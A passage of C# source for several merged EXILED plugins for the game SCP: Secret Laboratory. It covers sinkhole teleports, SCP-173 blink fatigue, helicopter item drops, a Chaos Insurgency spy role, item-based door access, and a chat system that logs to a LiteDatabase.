			HarmonyInstance.PatchAll();

		}

		public override void OnDisable()
		{
			HarmonyInstance.UnpatchAll();
		}

		public override void OnReload()
		{

		}
	}
}
namespace MultiPlugin17
{
	[HarmonyPatch(typeof(SinkholeEnvironmentalHazard), "DistanceChanged", new Type[] { typeof(GameObject) })]
	public class ImproveThoseSinkholesBaby
	{
		public static bool Prefix(SinkholeEnvironmentalHazard __instance, GameObject player)
		{

			if (!NetworkServer.active)
			{
				return false;
			}

			PlayerEffectsController componentInParent = player.GetComponentInParent<PlayerEffectsController>();
			if (componentInParent == null)
			{
				return false;
			}

			if ((double)Vector3.Distance(player.transform.position, __instance.transform.position) > (double)__instance.DistanceToBeAffected * Plugin.SlowDistance)
			{
				componentInParent.DisableEffect<CustomPlayerEffects.SinkHole>();
				return false;
			}

			if (__instance.SCPImmune)
			{
				CharacterClassManager component = player.GetComponent<CharacterClassManager>();
				if (component == null || component.IsAnyScp())
				{
					return false;
				}
			}

			if (Plugin.EnableBetterSinkholes && (double)Vector3.Distance(player.transform.position, __instance.transform.position) < (double)__instance.DistanceToBeAffected * Plugin.TeleportDistance)
			{
				player.GetComponent<PlayerMovementSync>().OverridePosition(Vector3.down * 1998.5f, 0f, true);
				PlayerEffectsController componentInParent2 = player.GetComponentInParent<PlayerEffectsController>();
				componentInParent2.DisableEffect<CustomPlayerEffects.SinkHole>();
				componentInParent2.GetEffect<CustomPlayerEffects.Corroding>().IsInPd = true;
				componentInParent2.EnableEffect<CustomPlayerEffects.Corroding>();
				QueryProcessor.Localplayer.GetComponent<Broadcast>().TargetAddElement(player.gameObject.GetComponent<NetworkIdentity>().connectionToClient, Plugin.TeleportMessage, Plugin.TeleportMessageDuration, 0);
				return false;
			}

			componentInParent.EnableEffect<CustomPlayerEffects.SinkHole>();
			return false;
		}
	}
}
namespace MultiPlugin18
{
	[HarmonyPatch(typeof(Scp173PlayerScript), "FixedUpdate")]
	public class BlinkPatchFixedUpdate
	{
		[HarmonyPriority(420)]
		public static bool Prefix(Scp173PlayerScript __instance)
		{
			BlinkCustomMethod.CustomBlinkingSequence(__instance);

			if (!__instance.iAm173 || (!__instance.isLocalPlayer && !Mirror.NetworkServer.active))
			{
				return false;
			}
			if (!BlinkCustomMethod.someoneLooking)
			{
				BlinkCustomMethod.reworkSubstractTime -= Time.fixedDeltaTime * BlinkConfigs.decreaseRate;
				if (BlinkCustomMethod.reworkSubstractTime < 0f)
				{
					BlinkCustomMethod.reworkSubstractTime = 0f;
				}
			}
			Scp173PlayerScript.Blinking = true;
			BlinkCustomMethod.someoneLooking = false;
			foreach (GameObject gameObject in PlayerManager.players)
			{
				Scp173PlayerScript component = gameObject.GetComponent<Scp173PlayerScript>();
				if (!component.SameClass
					&& component.GetComponent<CharacterClassManager>().CurClass != RoleType.Tutorial)
				{
					Scp173PlayerScript.Blinking = false;
					BlinkCustomMethod.someoneLooking = true;
					break;
				}
			}
			return false;
		}
	}
}
namespace MultiPlugin18
{
	public class BlinkFatigue : EXILED.Plugin
	{
		public static HarmonyInstance HarmonyInstance { set; get; }
		private static uint harmonyCounter = 0;
		public override string getName => "Multi Plugin";
		public bool enabled = false;
		public override void OnDisable()
		{
			if (enabled == false)
			{
				return;
			}

			enabled = false;
			HarmonyInstance.UnpatchAll();
		}
		public override void OnEnable()
		{
			enabled = Config.GetBool("mp_enable", true);

			if (enabled == false)
			{
				return;
			}

			HarmonyInstance = HarmonyInstance.Create($"blinkfatigue{harmonyCounter}");
			HarmonyInstance.PatchAll();

			BlinkConfigs.ReloadConfigs();

		}

		public override void OnReload()
		{
		}
	}
}
namespace MultiPlugin18
{
	internal static class BlinkCustomMethod
	{
		// Static fields needed to prevent multiple blinks.
		internal static float reworkSubstractTime = 0f;
		internal static bool someoneLooking = false;

		internal static void CustomBlinkingSequence(Scp173PlayerScript scpScript)
		{
			if (!scpScript.isServer || !scpScript.isLocalPlayer)
			{
				return;
			}

			scpScript.blinkDuration_notsee -= Time.fixedDeltaTime;
			scpScript.blinkDuration_see -= Time.fixedDeltaTime;

			if (scpScript.blinkDuration_see >= 0f)
			{
				return;
			}

			scpScript.maxBlinkTime = scpScript.blinkDuration_see + 0.4f;
			scpScript.blinkDuration_see = Mathf.Max(BlinkConfigs.minReworkBlinkTime, UnityEngine.Random.Range(BlinkConfigs.minBlinkTime, BlinkConfigs.maxBlinkTime) - reworkSubstractTime);

			if (someoneLooking)
			{
				float val = UnityEngine.Random.Range(BlinkConfigs.reworkAddMin, BlinkConfigs.reworkAddMax);
				reworkSubstractTime += val;
				// If SCP-173 is sick of your shit, this basically negates an infinite stacking of the blink fatigue ability
				if (reworkSubstractTime > BlinkConfigs.minBlinkTime)
				{
					reworkSubstractTime = BlinkConfigs.minBlinkTime;
				}
			}
			else
			{
				float val = UnityEngine.Random.Range(BlinkConfigs.reworkAddMin, BlinkConfigs.reworkAddMax) * BlinkConfigs.decreaseRate;
				reworkSubstractTime -= val;
				if (reworkSubstractTime < 0f)
				{
					reworkSubstractTime = 0f;
				}
			}

			var array = PlayerManager.players;
			for (int i = 0; i < array.Count; i++)
			{
				var comp = array[i].GetComponent<Scp173PlayerScript>();
				if (comp != null)
				{
					comp.Blink();
				}
			}
		}
	}
}
namespace MultiPlugin18
{
	public static class BlinkConfigs
	{
		internal static float decreaseRate;
		internal static float maxBlinkTime;
		internal static float minBlinkTime;
		internal static float minReworkBlinkTime;
		internal static float reworkAddMin;
		internal static float reworkAddMax;

		internal static void ReloadConfigs()
		{
			decreaseRate = EXILED.Plugin.Config.GetFloat("mp_blink_decreaserate", 0.75f);
	  minReworkBlinkTime = EXILED.Plugin.Config.GetFloat("mp_blink_minblinktime", 1.5f);
			minBlinkTime = EXILED.Plugin.Config.GetFloat("mp_blink_mintime", 2.5f);
			maxBlinkTime = EXILED.Plugin.Config.GetFloat("mp_blink_maxtime", 3.5f);
			reworkAddMin = EXILED.Plugin.Config.GetFloat("mp_blink_addmin", 0.35f);
			reworkAddMax = EXILED.Plugin.Config.GetFloat("mp_blink_addmax", 0.45f);
		}
	}
}
namespace MultiPlugin19
{
	public class ChopperDrop : Plugin
	{
		public EventHandlers EventHandlers;
		internal static string bc;
		internal static ushort bct;

		public override string getName
		{
			get
			{
				return nameof(ChopperDrop);
			}
		}

		public override void OnDisable()
		{
			foreach (CoroutineHandle coroutine in this.EventHandlers.coroutines)
				Timing.KillCoroutines(coroutine);
			Events.RoundStartEvent -= new Events.OnRoundStart(this.EventHandlers.RoundStart);
			Events.WaitingForPlayersEvent -= new Events.WaitingForPlayers(this.EventHandlers.WaitingForPlayers);
			this.EventHandlers = (EventHandlers)null;
		}

		public override void OnEnable()
		{
			if (!Plugin.Config.GetBool("mp_enable", true))
				return;
			bct = Plugin.Config.GetUShort("mp_chopper_drops_bc_time", 5);
			bc = Plugin.Config.GetString("mp_chopper_drops_bc", "<color=yellow>A helicopter with supplies arrived</color>");
			string[] strArray1 = Plugin.Config.GetString("mp_chopper_drops", "GrenadeFrag:4,Flashlight:1,GunMP7:4,GunUSP:2,Painkillers:4").Split(',');
			ChopperDrops drops = new ChopperDrops();
			int tim = Plugin.Config.GetInt("mp_chopper_time", 600);
			foreach (string str in strArray1)
			{
				char[] chArray = new char[1] { ':' };
				string[] strArray2 = str.Split(chArray);
				drops.AddToList(strArray2[0], int.Parse(strArray2[1]));
			}
			this.EventHandlers = new EventHandlers((Plugin)this, drops, tim);
			Events.RoundStartEvent += new Events.OnRoundStart(this.EventHandlers.RoundStart);
			Events.WaitingForPlayersEvent += new Events.WaitingForPlayers(this.EventHandlers.WaitingForPlayers);
		}

		public override void OnReload()
		{
		}
	}
}
namespace MultiPlugin19
{
	public static class Extenstions
	{
		public static void Broadcast(this ReferenceHub rh, ushort time, string message)
		{
			((Component)rh).GetComponent<Broadcast>().TargetAddElement(((NetworkBehaviour)rh.scp079PlayerScript).connectionToClient, message, time, 0);
		}
	}
}
namespace MultiPlugin19
{
	public class EventHandlers
	{
		public List<CoroutineHandle> coroutines = new List<CoroutineHandle>();
		public bool roundStarted = false;
		public Plugin pl;
		public ChopperDrops allowedItems;
		public int time;

		public EventHandlers(Plugin plugin, ChopperDrops drops, int tim)
		{
			this.pl = plugin;
			this.allowedItems = drops;
			this.time = tim;
		}

		internal void RoundStart()
		{
			this.roundStarted = true;
			foreach (CoroutineHandle coroutine in this.coroutines)
				Timing.KillCoroutines(coroutine);
			this.coroutines.Add(Timing.RunCoroutine(this.ChopperThread(), "ChopperThread"));
		}

		internal void WaitingForPlayers()
		{
			foreach (CoroutineHandle coroutine in this.coroutines)
				Timing.KillCoroutines(coroutine);
		}

		public IEnumerator<float> ChopperThread()
		{
			while (this.roundStarted)
			{
				yield return Timing.WaitForSeconds((float)this.time);
				ChopperAutostart ca = Object.FindObjectOfType<ChopperAutostart>();
				ca.SetState(true);
				List<ReferenceHub>.Enumerator enumerator1 = Plugin.GetHubs().GetEnumerator();
				try
				{
					while (enumerator1.MoveNext())
					{
						ReferenceHub h = enumerator1.Current;
						h.Broadcast(ChopperDrop.bct, ChopperDrop.bc);
						h = (ReferenceHub)null;
					}
				}
				finally
				{
					enumerator1.Dispose();
				}
				enumerator1 = new List<ReferenceHub>.Enumerator();
				yield return Timing.WaitForSeconds(15f);
				Vector3 spawn = Plugin.GetRandomSpawnPoint((RoleType)13);
				Dictionary<ItemType, int>.Enumerator enumerator2 = this.allowedItems.drops.GetEnumerator();
				try
				{
					while (enumerator2.MoveNext())
					{
						KeyValuePair<ItemType, int> drop = enumerator2.Current;
						for (int i = 0; i < drop.Value; ++i)
							this.SpawnItem(drop.Key, spawn, spawn);
						drop = new KeyValuePair<ItemType, int>();
					}
				}
				finally
				{
					enumerator2.Dispose();
				}
				enumerator2 = new Dictionary<ItemType, int>.Enumerator();
				ca.SetState(false);
				yield return Timing.WaitForSeconds(15f);
				ca = (ChopperAutostart)null;
				spawn = new Vector3();
			}
		}

		public void SpawnItem(ItemType type, Vector3 pos, Vector3 rot)
		{
			((GameObject)PlayerManager.localPlayer).GetComponent<Inventory>().SetPickup(type, 60f, pos, Quaternion.Euler(rot), 0, 0, 0);
		}
	}
}
namespace MultiPlugin19
{
	public class ChopperDrops
	{
		public Dictionary<ItemType, int> drops = new Dictionary<ItemType, int>();

		public void AddToList(string item, int amount)
		{
			try
			{
				this.drops.Add((ItemType)Enum.Parse(typeof(ItemType), item), amount);
			}
			catch
			{
			}
		}
	}
}
namespace MultiPlugin20
{
	partial class EventHandlers
	{
		internal static void MakeSpy(ReferenceHub player, bool isVulnerable = false, bool full = true)
		{
			if (!Configs.spawnWithGrenade && full)
			{
				for (int i = player.inventory.items.Count - 1; i >= 0; i--)
				{
					if (player.inventory.items[i].id == ItemType.GrenadeFrag)
					{
						player.inventory.items.RemoveAt(i);
					}
				}
			}
			spies.Add(player, isVulnerable);
			player.Broadcast(Configs.spawnbc, Configs.spawnbct);
			player.characterClassManager.TargetConsolePrint(player.scp079PlayerScript.connectionToClient, Configs.cm, Configs.cmc);
		}

		private ReferenceHub TryGet035()
		{
			return Scp035Data.GetScp035();
		}

		private void RevealSpies()
		{
			foreach (KeyValuePair<ReferenceHub, bool> spy in spies)
			{
				Inventory.SyncListItemInfo items = new Inventory.SyncListItemInfo();
				foreach (var item in spy.Key.inventory.items) items.Add(item);
				Vector3 pos = spy.Key.transform.position;
				Quaternion rot = spy.Key.transform.rotation;
				int health = (int)spy.Key.playerStats.Health;

				spy.Key.SetRole(RoleType.ChaosInsurgency);

				Timing.CallDelayed(0.3f, () =>
				{
					spy.Key.playerMovementSync.OverridePosition(pos, 0f);
					spy.Key.SetRotation(rot.x, rot.y);
					spy.Key.inventory.items.Clear();
					foreach (var item in items) spy.Key.inventory.AddNewItem(item.id);
					spy.Key.playerStats.Health = health;
				});

				spy.Key.Broadcast(Configs.acdb, Configs.acdbt);
			}
			spies.Clear();
		}

		private void GrantFF(ReferenceHub player)
		{
			player.weaponManager.NetworkfriendlyFire = true;
			ffPlayers.Add(player);
		}

		private void RemoveFF(ReferenceHub player)
		{
			player.weaponManager.NetworkfriendlyFire = false;
			ffPlayers.Remove(player);
		}
	}
}
namespace MultiPlugin20
{
	public static class Extensions
	{

		public static void SetRank(this ReferenceHub player, string rank, string color = "default")
		{
			player.serverRoles.NetworkMyText = rank;
			player.serverRoles.NetworkMyColor = color;
		}

		public static void RefreshTag(this ReferenceHub player)
		{
			player.serverRoles.HiddenBadge = null;
			player.serverRoles.RpcResetFixed();
			player.serverRoles.RefreshPermissions(true);
		}

		public static void HideTag(this ReferenceHub player)
		{
			player.serverRoles.HiddenBadge = player.serverRoles.MyText;
			player.serverRoles.NetworkGlobalBadge = null;
			player.serverRoles.SetText(null);
			player.serverRoles.SetColor(null);
			player.serverRoles.RefreshHiddenTag();
		}
		public static float GenerateRandomNumber(float min, float max)
		{
			if (max + 1 <= min) return min;
			return (float)new System.Random().NextDouble() * ((max + 1) - min) + min;
		}
		public static void Broadcast(this ReferenceHub player, string message, ushort time)
		{
			player.GetComponent<Broadcast>().TargetAddElement(player.scp079PlayerScript.connectionToClient, message, time, 0);
		}

	}
}
namespace MultiPlugin20
{
	partial class EventHandlers
	{
		internal static Dictionary<ReferenceHub, bool> spies = new Dictionary<ReferenceHub, bool>();
		private List<ReferenceHub> ffPlayers = new List<ReferenceHub>();
		internal static bool cispyview = false;
		private bool isDisplayFriendly = false;
		//private bool isDisplaySpy = false;

		private System.Random rand = new System.Random();

		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfigs();
		}

		public void OnRoundStart()
		{
			spies.Clear();
			ffPlayers.Clear();
			if (rand.Next(1, 101) <= Configs.guardSpawnChance)
			{
				ReferenceHub player = Player.GetHubs().FirstOrDefault(x => x.GetRole() == RoleType.FacilityGuard);
				if (player != null)
				{
					MakeSpy(player);
				}
			}
		}

		public void OnTeamRespawn(ref TeamRespawnEvent ev)
		{
			if (!ev.IsChaos && rand.Next(1, 101) <= Configs.spawnChance && ev.ToRespawn.Count >= Configs.minimumSquadSize)
			{
				List<ReferenceHub> respawn = new List<ReferenceHub>(ev.ToRespawn);
				Timing.CallDelayed(0.1f, () =>
				{
					Log.Warn(Configs.spyRoles.Count.ToString());
					List<ReferenceHub> roleList = respawn.Where(x => Configs.spyRoles.Contains((int)x.GetRole())).ToList();
					if (roleList.Count > 0)
					{
						ReferenceHub player = roleList[rand.Next(roleList.Count)];
						if (player != null)
						{
							MakeSpy(player);
						}
					}
				});
			}
		}

		public void OnSetClass(SetClassEvent ev)
		{
			if (spies.ContainsKey(ev.Player))
			{
				Timing.CallDelayed(0.1f, () => spies.Remove(ev.Player));
			}
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (spies.ContainsKey(ev.Player))
			{
				spies.Remove(ev.Player);
				ev.Player.SetRank("");
			}

			ReferenceHub player = ev.Player;

			ReferenceHub scp035 = null;

			try
			{
				scp035 = TryGet035();
			}
			catch (Exception x)
			{
				Log.Debug("SCP-035 not installed, skipping method call...");
			}

			int playerid = ev.Player.queryProcessor.PlayerId;
			List<Team> pList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != playerid && !spies.ContainsKey(x) && x.queryProcessor.PlayerId != scp035?.queryProcessor.PlayerId).Select(x => x.GetTeam()).ToList();

			if ((!pList.Contains(Team.CHI) && !pList.Contains(Team.CDP)) ||
			((pList.Contains(Team.CDP) || pList.Contains(Team.CHI)) && !pList.Contains(Team.MTF) && !pList.Contains(Team.RSC)))
			{
				RevealSpies();
			}
		}

		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ffPlayers.Contains(ev.Attacker))
			{
				RemoveFF(ev.Attacker);
			}

			ReferenceHub scp035 = null;

			try
			{
				scp035 = TryGet035();
			}
			catch (Exception x)
			{
				Log.Debug("SCP-035 not installed, skipping method call...");
			}

			if (spies.ContainsKey(ev.Player) && !spies.ContainsKey(ev.Attacker) && ev.Player.queryProcessor.PlayerId != ev.Attacker.queryProcessor.PlayerId && (ev.Attacker.GetTeam() == Team.CHI || ev.Attacker.GetTeam() == Team.CDP))
			{
				if (!isDisplayFriendly)
				{
					ev.Attacker.Broadcast(Configs.teamshootbc, Configs.teamshootbct);
					isDisplayFriendly = true;
				}
				Timing.CallDelayed(3f, () =>
				{
					isDisplayFriendly = false;
				});
				ev.Amount = 0;
			}
			else if (!spies.ContainsKey(ev.Player) && spies.ContainsKey(ev.Attacker) && (ev.Player.GetTeam() == Team.CHI || ev.Player.GetTeam() == Team.CDP) && ev.Player.queryProcessor.PlayerId != scp035?.queryProcessor.PlayerId)
			{
				ev.Amount = 0;
			}
		}
		public void OnShoot(ref ShootEvent ev)
		{
			if (ev.Target == null) return;
			ReferenceHub target = Player.GetPlayer(ev.Target);
			if (target == null) return;

			ReferenceHub scp035 = null;

			try
			{
				scp035 = TryGet035();
			}
			catch (Exception x)
			{
				Log.Debug("SCP-035 not installed, skipping method call...");
			}

			if (spies.ContainsKey(ev.Shooter) && !spies.ContainsKey(target) && (Player.GetTeam(target) == Team.RSC || Player.GetTeam(target) == Team.MTF) && target.queryProcessor.PlayerId != scp035?.queryProcessor.PlayerId)
			{
				if (!spies[ev.Shooter])
				{
					spies[ev.Shooter] = true;
					ev.Shooter.Broadcast(Configs.shootbc.Replace("%team%", $"{(target.GetTeam() == Team.MTF ? "<color=#00b0fc>Nine Tailed Fox" : $"<color=#fcff8d>{Configs.scientist}</color>")}"), Configs.shootbct);
					ev.Shooter.SetRank(Configs.role, Configs.rolec);
					cispyview = true;
				}
				GrantFF(ev.Shooter);
			}
			else if (spies.ContainsKey(target) && !spies.ContainsKey(ev.Shooter) && (ev.Shooter.GetTeam() == Team.MTF || ev.Shooter.GetTeam() == Team.RSC))
			{
				if (spies[target])
				{
					GrantFF(ev.Shooter);
				}
			}
		}
	}
}
namespace MultiPlugin20
{
	public class Plugin : EXILED.Plugin
	{
		private EventHandlers ev;

		public override void OnEnable()
		{
			if (!Config.GetBool("mp_enabled", true)) return;

			ev = new EventHandlers();

			Events.WaitingForPlayersEvent += ev.OnWaitingForPlayers;
			Events.RoundStartEvent += ev.OnRoundStart;
			Events.TeamRespawnEvent += ev.OnTeamRespawn;
			Events.SetClassEvent += ev.OnSetClass;
			Events.PlayerDeathEvent += ev.OnPlayerDie;
			Events.PlayerHurtEvent += ev.OnPlayerHurt;
			Events.ShootEvent += ev.OnShoot;
		}

		public override void OnDisable()
		{
			Events.WaitingForPlayersEvent -= ev.OnWaitingForPlayers;
			Events.RoundStartEvent -= ev.OnRoundStart;
			Events.TeamRespawnEvent -= ev.OnTeamRespawn;
			Events.SetClassEvent -= ev.OnSetClass;
			Events.PlayerDeathEvent -= ev.OnPlayerDie;
			Events.PlayerHurtEvent -= ev.OnPlayerHurt;
			Events.ShootEvent -= ev.OnShoot;

			ev = null;
		}

		public override void OnReload() { }

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin20
{
	class Configs
	{
		internal static List<int> spyRoles;

		internal static bool spawnWithGrenade;

		internal static int spawnChance;
		internal static int guardSpawnChance;
		internal static int minimumSquadSize;
		internal static ushort shootbct;
		internal static string shootbc;
		internal static string scientist;
		internal static string role;
		internal static string rolec;
		internal static ushort teamshootbct;
		internal static string teamshootbc;
		internal static ushort spawnbct;
		internal static string spawnbc;
		internal static string cm;
		internal static string cmc;
		internal static ushort acdbt;
		internal static string acdb;

		internal static void ReloadConfigs()
		{
			spyRoles = Plugin.Config.GetIntList("mp_cis_spy_roles");
			if (spyRoles == null || spyRoles.Count == 0)
			{
				spyRoles = new List<int>() { 11, 13 };
			}

			spawnWithGrenade = Plugin.Config.GetBool("mp_cis_spawn_with_grenade", true);

			spawnChance = Plugin.Config.GetInt("mp_cis_spawn_chance", 60);
			guardSpawnChance = Plugin.Config.GetInt("mp_cis_guard_chance", 50);
			minimumSquadSize = Plugin.Config.GetInt("mp_cis_minimum_size", 6);
			shootbc = Plugin.Config.GetString("mp_cis_shoot_bc", "You attacked a %team%, you are now able to be killed by <color=#00b0fc>Nine Tailed Fox</color> and <color=#fcff8d>Scientists</color>");
			shootbct = Plugin.Config.GetUShort("mp_cis_shoot_bc_time", 10);
			scientist = Plugin.Config.GetString("mp_cis_scientist", "Scientist");
			role = Plugin.Config.GetString("mp_cis_role", "CISpy");
			rolec = Plugin.Config.GetString("mp_cis_role_color", "green");
			teamshootbc = Plugin.Config.GetString("mp_cis_team_shoot_bc", "You are shooting a <b><color=\"green\">CISpy!</color></b>");
			teamshootbct = Plugin.Config.GetUShort("mp_cis_team_shoot_bc_time", 3);
			spawnbc = Plugin.Config.GetString("mp_cis_spawn_bc", "<size=60>You are a <b><color=\"green\">CISpy</color></b></size>\nCheck your console by pressing [`] or [~] for more info.");
			spawnbct = Plugin.Config.GetUShort("mp_cis_spawn_bc_time", 3);
			cm = Plugin.Config.GetString("mp_cis_console_msg", "You are a Chaos Insurgency Spy! You are immune to MTF for now, but as soon as you damage an MTF, your spy immunity will turn off.\n\nHelp Chaos win the round and kill as many MTF and Scientists as you can.");
			cmc = Plugin.Config.GetString("mp_cis_console_msg_color", "yellow");
			acdb = Plugin.Config.GetString("mp_cis_all_ci_dead_bc", "Your fellow <color=\"green\">Chaos Insurgency</color> have died.\nYou have been revealed!");
			acdbt = Plugin.Config.GetUShort("mp_cis_all_ci_dead_bc_time", 10);
		}
	}
}
namespace MultiPlugin21
{
	public class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		public void OnDoorInteract(ref DoorInteractionEvent ev)
		{

			var ply = ev.Player;

			foreach (KeyValuePair<string, string> x in Plugin.accessSet)
			{

				if (ev.Door.DoorName.Equals(x.Key))
				{
					string trimmedValue = x.Value.Trim();
					string[] itemIDs = trimmedValue.Split('&');

					foreach (string eachValue in itemIDs)
					{
						int currentItem = Array.FindIndex(ply.inventory.availableItems,
							r => r.id == ply.inventory.curItem);

						if (Int32.TryParse(eachValue, out int itemID))
						{
							if (currentItem.Equals(itemID) && !currentItem.Equals(-1))
							{
								ev.Allow = true;
							}
							else if (Plugin.revokeAll && !itemIDs.Contains(currentItem.ToString()))
							{
								ev.Allow = false;
								if (Plugin.scpAccess)
								{
									foreach (string scpAccessDoor in Plugin.scpAccessDoors)
									{
										if (ev.Door.DoorName.Equals(scpAccessDoor))
										{
											if (ply.characterClassManager.IsAnyScp())
											{
												ev.Allow = true;
											}
										}
									}
								}
								else if (ply.serverRoles.BypassMode)
								{
									ev.Allow = true;
								}
							}
						}
						else
						{
							Log.Error(x.Value + " is not a int.");
						}
					}
				}
			}
		}
	}
}
namespace MultiPlugin21
{
	public class Plugin : EXILED.Plugin
	{
		public EventHandlers EventHandlers;
		public static Dictionary<string, string> accessSet;
		public static bool revokeAll;
		public static bool scpAccess;
		public static List<string> scpAccessDoors;

		public override void OnEnable()
		{
			ReloadConfigs();

			EventHandlers = new EventHandlers(this);
			Events.DoorInteractEvent += EventHandlers.OnDoorInteract;
		}

		private void ReloadConfigs()
		{
			try
			{
				accessSet = Config.GetString("mp_cda_access_set", string.Empty).Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
					.Select(part => part.Split(':'))
					.ToDictionary(split => split[0], split => split[1]);
				revokeAll = Config.GetBool("mp_cda_revoke_all", false);
				scpAccess = Config.GetBool("mp_cda_scp_access", false);
				scpAccessDoors = Config.GetString("mp_cda_scp_access_doors", string.Empty).Split(',').ToList();
			}
			catch (Exception e)
			{
				Log.Error("Error: " + e.Message);
			}
		}

		public override void OnDisable()
		{
			Events.DoorInteractEvent -= EventHandlers.OnDoorInteract;
			EventHandlers = null;
		}

		public override void OnReload()
		{

		}

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin22
{
	public class MultiPlugin22 : Plugin
	{
		#region Properties
		internal RoundHandler RoundHandler { get; private set; }
		internal PlayerHandler PlayerHandler { get; private set; }

		public Dictionary<string, ICommand> ConsoleCommands { get; private set; } = new Dictionary<string, ICommand>();
		public Dictionary<string, ICommand> RemoteAdminCommands { get; private set; } = new Dictionary<string, ICommand>();
		#endregion

		public override string getName => "Multi Plugin";

		public override void OnEnable()
		{
			Configs.Reload();

			if (!Configs.isEnabled) return;

			RegisterEvents();
			RegisterCommands();

			Database.Open();

			Log.Info($"{getName} has been Enabled!");
		}

		public override void OnDisable()
		{
			Configs.isEnabled = false;

			UnregisterEvents();
			UnregisterCommands();

			Database.Close();

			Log.Info($"{getName} has been Disabled!");
		}

		public override void OnReload()
		{
			Config.Reload();

			Log.Info($"{getName} has been Reloaded!");
		}

		#region Events
		private void RegisterEvents()
		{
			RoundHandler = new RoundHandler();
			PlayerHandler = new PlayerHandler(this);

			EXILED.Events.RoundRestartEvent += RoundHandler.OnRoundRestart;

			EXILED.Events.ConsoleCommandEvent += PlayerHandler.OnConsoleCommand;
			EXILED.Events.RemoteAdminCommandEvent += PlayerHandler.OnRemoteAdminCommand;
			EXILED.Events.PlayerJoinEvent += PlayerHandler.OnPlayerJoin;
			EXILED.Events.PlayerLeaveEvent += PlayerHandler.OnPlayerLeave;
		}

		private void UnregisterEvents()
		{
			EXILED.Events.RoundRestartEvent -= RoundHandler.OnRoundRestart;

			EXILED.Events.ConsoleCommandEvent -= PlayerHandler.OnConsoleCommand;
			EXILED.Events.RemoteAdminCommandEvent -= PlayerHandler.OnRemoteAdminCommand;
			EXILED.Events.PlayerJoinEvent -= PlayerHandler.OnPlayerJoin;
			EXILED.Events.PlayerLeaveEvent -= PlayerHandler.OnPlayerLeave;

			RoundHandler = null;
			PlayerHandler = null;
		}
		#endregion

		#region Commands
		private void RegisterCommands()
		{
			ConsoleCommands.Add("chat", new PublicChat());
			ConsoleCommands.Add("chat_team", new TeamChat());
			ConsoleCommands.Add("chat_private", new PrivateChat());
			ConsoleCommands.Add("help", new Help(this));

			RemoteAdminCommands.Add("chat_mute", new Commands.RemoteAdmin.Mute());
			RemoteAdminCommands.Add("chat_unmute", new Unmute());
		}

		private void UnregisterCommands()
		{
			ConsoleCommands.Clear();
			RemoteAdminCommands.Clear();
		}
		#endregion
	}
}
namespace MultiPlugin22
{
	internal static class Database
	{
		public static LiteDatabase LiteDatabase { get; private set; }
		public static Dictionary<ReferenceHub, Collections.Chat.Player> ChatPlayers { get; private set; } = new Dictionary<ReferenceHub, Collections.Chat.Player>();

		public static string Folder => Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Plugins"), Configs.databaseName);
		public static string FullPath => Path.Combine(Folder, $"{Configs.databaseName}.db");

		public static void Open()
		{
			try
			{
				if (!Directory.Exists(Folder)) Directory.CreateDirectory(Folder);

				LiteDatabase = new LiteDatabase(FullPath);

				LiteDatabase.GetCollection<Collections.Chat.Mute>().EnsureIndex(mute => mute.Target.Id);
				LiteDatabase.GetCollection<Collections.Chat.Mute>().EnsureIndex(mute => mute.Issuer.Id);
				LiteDatabase.GetCollection<Collections.Chat.Mute>().EnsureIndex(mute => mute.Timestamp);
				LiteDatabase.GetCollection<Collections.Chat.Mute>().EnsureIndex(mute => mute.Expire);
				LiteDatabase.GetCollection<Collections.Chat.Room>().EnsureIndex(room => room.Type);
				LiteDatabase.GetCollection<Collections.Chat.Room>().EnsureIndex(room => room.Message.Sender.Id);

				Log.Info("The database has been loaded successfully!");
			}
			catch (Exception exception)
			{
				Log.Error($"An error has occurred while opening the database: {exception}");
			}
		}

		public static void Close()
		{
			try
			{
				LiteDatabase.Checkpoint();
				LiteDatabase.Dispose();
				LiteDatabase = null;

				Log.Info("The database has been closed successfully!");
			}
			catch (Exception exception)
			{
				Log.Error($"An error has occurred while closing the database: {exception}");
			}
		}

		public static void SaveMessage(string message, Collections.Chat.Player sender, List<Collections.Chat.Player> targets, ChatRoomType chatRoomType)
		{
			LiteDatabase.GetCollection<Collections.Chat.Room>().Insert(new Collections.Chat.Room()
			{
				Message = new Collections.Chat.Message()
				{
					Sender = sender,
					Targets = targets,
					Content = message,
					Timestamp = DateTime.Now
				},
				Type = chatRoomType
			});
		}
	}
}
namespace MultiPlugin22
{
	internal static class Configs
	{
		public static bool isEnabled;
		public static string databaseName;
		public static string generalChatColor;
		public static string privateMessageColor;
		public static int maxMessageLength;
		public static bool censorBadWords;
		public static char censorBadWordsChar;
		public static List<string> badWords;
		public static bool saveChatToDatabase;
		public static bool canSpectatorSendMessagesToAlive;
		public static bool showChatMutedBroadcast;
		public static ushort chatMutedBroadcastDuration;
		public static string chatMutedBroadcast;
		public static bool showPrivateMessageNotificationBroadcast;
		public static uint privateMessageNotificationBroadcastDuration;
		public static string privateMessageNotificationBroadcast;
		public static bool isSlowModeEnabled;
		public static TimeSpan slowModeCooldown;
		public static string min;
		public static string sec;
		public static string reason;
		public static string msg;
		public static string command;
		public static string commandlist;
		public static string team;
		public static string publict;
		public static string privatet;
		public static string l1;
		public static string l2;
		public static string l3;
		public static string l4;
		public static string l5;
		public static string l6;
		public static string l7;
		public static string l8;
		public static string l9;
		public static string l10;
		public static string l11;
		public static string l12;
		public static string l13;
		public static string l14;
		public static string l15;
		public static string l16;
		public static string l17;
		public static string l18;
		public static string l19;
		public static string l20;
		public static string l21;
		public static string l22;
		public static string l23;
		public static string l24;
		public static string l25;
		public static string l26;
		public static string l27;
		public static string l28;
		public static string l29;
		public static string l30;
		public static string l31;
		public static string l32;
		public static string l33;

		public static void Reload()
		{
			isEnabled = Plugin.Config.GetBool("mp_enabled", true);
			databaseName = Plugin.Config.GetString("mp_database_name", "MultiPluginChat");
			generalChatColor = Plugin.Config.GetString("mp_general_chat_color", "cyan");
			privateMessageColor = Plugin.Config.GetString("mp_private_message_color", "magenta");
			maxMessageLength = Plugin.Config.GetInt("mp_max_message_length", 100);
